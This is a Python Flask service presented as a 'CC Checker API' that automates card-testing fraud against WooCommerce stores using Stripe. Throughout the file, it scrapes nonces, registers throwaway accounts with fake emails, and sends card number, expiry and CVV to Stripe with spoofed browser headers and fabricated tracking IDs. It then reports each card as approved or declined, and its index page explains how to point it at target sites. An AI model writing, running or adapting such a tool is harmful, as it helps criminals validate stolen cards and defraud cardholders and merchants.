from flask import Flask, request, jsonify
import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional
from faker import Faker

app = Flask(__name__)
faker = Faker()

# Helper functions
def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
    
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {} 
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}

    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        
        if 'message' in response_json:
            return response_json['message']
        
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value:
                return value['message']
        
        if "error" in response_json and "message" in response_json["error"]:
            return f"| {response_json['error']['message']}"

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"

    except json.JSONDecodeError:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match:
            return match.group(1)
        
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:200]}..."
    except Exception as e:
        return f"An unexpected error occurred during message extraction: {e}"

def parse_cc_string(cc_string):
    """Parse credit card string in format: 4147768578745265|04|2026|168"""
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Expected: NUMBER|MM|YYYY|CVV")
    
    card_num = parts[0].strip()
    card_mm = parts[1].strip()
    card_yy = parts[2].strip()[-2:]  # Get last 2 digits of year
    card_cvv = parts[3].strip()
    
    return card_num, card_mm, card_yy, card_cvv

def determine_status(response_text: str, response_json: dict = None) -> tuple:
    """Determine status based on response message"""
    if response_json and response_json.get("success"):
        return "Approved", "New Payment Method Added Successfully"
    
    # Check for common decline patterns
    decline_patterns = [
        'declined', 'decline', 'fail', 'error', 'invalid', 'incorrect',
        'not authorized', 'unauthorized', 'rejected', 'unsuccessful',
        'card was declined', 'card declined', 'payment declined'
    ]
    
    response_lower = response_text.lower()
    
    for pattern in decline_patterns:
        if pattern in response_lower:
            return "Declined", "Your Card was Declined"
    
    # Check for approval patterns - return custom message for approved
    approval_patterns = [
        'approved', 'success', 'successful', 'accepted', 'valid',
        'card was approved', 'payment successful', 'setup intent',
        'payment method added', 'new payment method'
    ]
    
    for pattern in approval_patterns:
        if pattern in response_lower:
            return "Approved", "New Payment Method Added Successfully"
    
    # Default to Declined if uncertain
    return "Declined", "Your Card was Declined"

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid, base_url):
    
    session = requests.Session()
    
    print("Starting New Session Session -> @blinkisop ")
    print(f"Using base URL: {base_url}")

    # Request 1: Initial GET
    print("\n1. Performing initial GET request...")
    url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_1 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    
    try:
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        print(f"   - Extracted regester_nouce: {regester_nouce}")
        print(f"   - Extracted pk: {pk}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 1 Failed: {e}")
        return "Request Failed", f"Initial request failed: {e}"

    # Request 2: POST to register email
    print("\n2. Performing POST request to register email...")
    url_2 = f'{base_url}/en/moj-racun/add-payment-method/'
    headers_2 = {
        'User-Agent': user_ag,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
    }
    data_2 = {
        'email': faker.email(domain="gamil.com"),
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': url_1,
        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'wc_order_attribution_session_pages': '2',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': user_ag,
        'woocommerce-register-nonce': regester_nouce,
        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
        'register': 'Register',
    }
    
    try:
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        print(f"   - Extracted ajax_nonce: {ajax_nonce}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 2 Failed: {e}")
        return "Request Failed", f"Registration failed: {e}"

    # Request 3: POST to Stripe API
    print("\n3. Performing POST request to Stripe API...")
    url_3 = 'https://api.stripe.com/v1/payment_methods'
    headers_3 = {
        'User-Agent': user_ag,
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://js.stripe.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Priority': 'u=4',
    }
    
    data_3 = {
        'type': 'card',
        f'card[number]': card_num,
        f'card[cvc]': card_cvv,
        f'card[exp_year]': card_yy,
        f'card[exp_month]': card_mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '11081',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
        'referrer': f'{base_url}',
        'time_on_page': str(random.randint(100000, 999999)),
        'client_attribution_metadata[client_session_id]': client_element,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
        'client_attribution_metadata[merchant_integration_version]': '2021',
        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
        'client_attribution_metadata[elements_session_config_id]': client_element,
        'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'key': pk,
        '_stripe_version': '2024-06-20',
    }
    
    try:
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        
        pm = response_3.json()['id']
        print(f"   - Extracted pm (payment method ID): {pm}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        print(f"   - Request 3 Failed: {e}")
        print(f"   - Response Text: {response_3.text if 'response_3' in locals() else 'No response'}")
        return "Declined", "Your Card was Declined"

    # Request 4: Final POST with wc-ajax
    print("\n4. Performing final POST request with wc-ajax and pm...")
    url_4 = f'{base_url}/en/'
    headers_4 = {
        'User-Agent': user_ag,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': base_url,
        'Alt-Used': base_url.replace('https://', ''),
        'Connection': 'keep-alive',
        'Referer': url_1,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    
    dynamic_params_4 = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': ajax_nonce,
    }
    
    try:
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session)
        
        print("\n--- Final Request Response (Raw Text) ---")
        print(response_4.text)
        
        try:
            response_json = response_4.json()
            status, message = determine_status(response_4.text, response_json)
        except:
            status, message = determine_status(response_4.text)
        
        print("\n--- Final Result ---")
        print(f"Status: {status}")
        print(f"Message: {message}")
        
        return status, message
    except Exception as e:
        print(f"   - Request 4 Failed: {e}")
        print(f"   - Response Text: {response_4.text if 'response_4' in locals() else 'No response'}")
        return "Declined", "Your Card was Declined"

@app.route('/check', methods=['GET'])
def check_cc():
    # Parse parameters from URL
    gateway = request.args.get('gateway', '')
    key = request.args.get('key', '')
    site = request.args.get('site', '')
    cc = request.args.get('cc', '')
    
    print(f"\n=== Received Request ===")
    print(f"Gateway: {gateway}")
    print(f"Key: {key}")
    print(f"Site: {site}")
    print(f"CC: {cc}")
    
    # Validate parameters
    if not all([gateway, key, site, cc]):
        return jsonify({
            'status': 'Error',
            'response': 'Missing parameters. Required: gateway, key, site, cc',
        }), 400
    
    # Parse CC details
    try:
        card_num, card_mm, card_yy, card_cvv = parse_cc_string(cc)
    except ValueError as e:
        return jsonify({
            'status': 'Error',
            'response': f'Invalid CC format: {str(e)}'
        }), 400
    
    # Prepare base URL from site parameter
    if not site.startswith('http'):
        base_url = f'https://{site}'
    else:
        base_url = site
    
    # Default values
    USER_AGENT = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    CLIENT_ELEMENT = f'src_{key.lower()}'
    GUID = f'guid_{key.lower()}'
    MUID = f'muid_{key.lower()}'
    SID = f'sid_{key.lower()}'
    
    # Run the automated process
    try:
        status, response_message = run_automated_process(
            card_num=card_num,
            card_cvv=card_cvv,
            card_yy=card_yy,
            card_mm=card_mm,
            user_ag=USER_AGENT,
            client_element=CLIENT_ELEMENT,
            guid=GUID,
            muid=MUID,
            sid=SID,
            base_url=base_url
        )
        
        # Format the response exactly as requested
        return jsonify({
            'status': status,
            'response': response_message
        })
        
    except Exception as e:
        return jsonify({
            'status': 'Error',
            'response': f'Processing error: {str(e)}'
        }), 500

@app.route('/')
def index():
    return '''
    <html>
        <head>
            <title>CC Checker API</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .endpoint { background: #f5f5f5; padding: 20px; border-radius: 5px; margin: 20px 0; }
                code { background: #e0e0e0; padding: 2px 5px; border-radius: 3px; }
                pre { background: #333; color: #fff; padding: 15px; border-radius: 5px; overflow-x: auto; }
            </style>
        </head>
        <body>
            <h1>CC Checker API</h1>
            <p>Use the following endpoint to check credit cards:</p>
            
            <div class="endpoint">
                <h3>Endpoint:</h3>
                <code>GET /check?gateway=autostripe&key=BlackXCard&site=black.com&cc=4147768578745265|04|2026|168</code>
                
                <h3>Parameters:</h3>
                <ul>
                    <li><code>gateway</code>: Payment gateway (e.g., autostripe)</li>
                    <li><code>key</code>: API key/identifier</li>
                    <li><code>site</code>: Target website domain (e.g., black.com or https://black.com)</li>
                    <li><code>cc</code>: Credit card details in format: NUMBER|MM|YYYY|CVV</li>
                </ul>
                
                <h3>Example Request:</h3>
                <code>/check?gateway=autostripe&key=BlackXCard&site=black.com&cc=4147768578745265|04|2026|168</code>
                
                <h3>Approved Response:</h3>
                <pre>{
  "response": "New Payment Method Added Successfully",
  "status": "Approved"
}</pre>

                <h3>Declined Response:</h3>
                <pre>{
  "response": "Your Card was Declined",
  "status": "Declined"
}</pre>
                
                <h3>Test Examples:</h3>
                <ul>
                    <li><code>/check?gateway=autostripe&key=TestKey&site=example.com&cc=4111111111111111|12|2025|123</code></li>
                    <li><code>/check?gateway=autostripe&key=DemoKey&site=https://dilaboards.com&cc=4242424242424242|06|2026|789</code></li>
                </ul>
            </div>
        </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8081)
